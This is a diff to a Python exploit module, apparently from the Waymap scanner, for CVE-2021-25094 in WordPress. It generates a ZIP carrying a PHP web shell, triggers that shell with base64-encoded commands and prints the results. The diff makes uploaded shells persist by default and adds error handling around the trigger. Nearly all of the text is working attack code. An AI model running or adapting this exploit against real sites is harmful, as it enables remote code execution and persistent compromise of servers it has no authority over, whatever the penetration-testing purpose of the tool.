@@ -1,6 +1,6 @@
 # Copyright (c) 2024 Waymap developers
 # See the file 'LICENSE' for copying permission.
-# CVE-2021-25094
+# CVE-2021-25094 - WordPress Vulnerability Exploit
 
 import requests
 import urllib3
@@ -15,7 +15,7 @@ from colorama import init, Fore, Style
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
-def generate_zip(compression_level=9, technique="php", keep=False):
+def generate_zip(compression_level=9, technique="php", keep=True):
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Generating ZIP file with shell technique '{technique}'")
 
     buffer = io.BytesIO()
@@ -90,15 +90,19 @@ def trigger_shell(profile_url, zipname, shell_filename, cmd):
     encoded_cmd = base64.b64encode(cmd.encode("utf8")).decode("utf8")
     
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Triggering shell at {shell_url}")
-    r = requests.post(url=shell_url, data={"text": encoded_cmd}, verify=False)
-    
-    if r.status_code != 200:
-        print(f"{Style.BRIGHT}{Fore.RED}[!] Shell trigger failed! HTTP {r.status_code} - {r.text}")
+    try:
+        r = requests.post(url=shell_url, data={"text": encoded_cmd}, verify=False)
+        if r.status_code != 200:
+            print(f"{Style.BRIGHT}{Fore.RED}[!] Shell trigger failed! HTTP {r.status_code} - {r.text}")
+            return False
+        
+        print(f"{Style.BRIGHT}{Fore.GREEN}[+] Shell triggered successfully!")
+        print(r.text)
+        return True
+
+    except Exception as e:
+        print(f"{Style.BRIGHT}{Fore.RED}[-] Error during shell triggering: {e}")
         return False
-    
-    print(f"{Style.BRIGHT}{Fore.GREEN}[+] Shell triggered successfully!")
-    print(r.text)
-    return True
 
 
 def scan_cve_2021_25094(profile_url):
@@ -107,7 +111,7 @@ def scan_cve_2021_25094(profile_url):
 
     for technique in techniques:
         print(f"{Style.BRIGHT}{Fore.CYAN}[•] Attempting exploitation using technique: {technique}")
-        zip_file, zipname, shell_filename = generate_zip(technique=technique)
+        zip_file, zipname, shell_filename = generate_zip(technique=technique, keep=True)
 
         if zip_file is None or zipname is None or shell_filename is None:
             print(f"{Style.BRIGHT}{Fore.RED}[!] Exploitation failed due to ZIP generation error with technique: {technique}")
